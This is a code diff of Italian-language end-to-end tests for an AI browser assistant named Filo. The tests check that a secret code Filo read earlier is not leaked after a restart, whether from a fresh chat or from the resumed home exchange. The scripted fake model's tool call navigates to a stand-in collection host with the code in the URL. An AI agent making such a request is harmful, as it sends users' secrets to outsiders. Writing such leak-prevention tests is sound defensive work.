@@ -1027,8 +1027,9 @@ test('il codice nel titolo di una scheda aperta, che la chat ha davanti, non esc
 });
 
 // Le frasi di Filo che ripetono un segreto letto restano dopo un riavvio (azioni recenti, home, appunti): anche
-// quello che aveva letto resta, e una chat nuova dopo il riavvio non lo porta fuori.
-test('dopo un riavvio vero, una chat nuova non porta fuori il codice che Filo aveva letto prima', async () => {
+// quello che aveva letto resta. La home riaperta ha in fondo lo scambio di prima (#869): né continuarlo né cominciare
+// una chat nuova con «/clear» porta fuori il codice.
+for (const { nome, nuova } of [{ nome: 'una chat nuova', nuova: true }, { nome: 'lo scambio che la home riprende', nuova: false }]) test(`dopo un riavvio vero, ${nome} non porta fuori il codice che Filo aveva letto prima`, async () => {
   test.setTimeout(150_000);
   const userData = cartellaTemporanea('filo-segreti-letti-');
   const launch = () => electron.launch({
@@ -1059,12 +1060,13 @@ test('dopo un riavvio vero, una chat nuova non porta fuori il codice che Filo av
     const page = await newtab(app);
     await preparaModelli(app);
     await senzaAccoglienza(app, page);
-    // La home riaperta ha in fondo lo scambio di prima (#869), con la frase che ripete il codice; «/clear» chiude quella
-    // conversazione, e la domanda dopo ne comincia una nuova.
     await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toBeVisible({ timeout: 10_000 });
-    await page.locator('#input').fill('/clear');
-    await page.locator('#input').press('Enter');
-    await expect(page.locator('#input')).toHaveValue('');
+    if (nuova) {
+      await page.locator('#input').fill('/clear');
+      await page.locator('#input').press('Enter');
+      await expect(page.locator('#input')).toHaveValue('');
+      await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toHaveCount(0);
+    }
     await modelloFinto(app, {
       giri: [
         { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
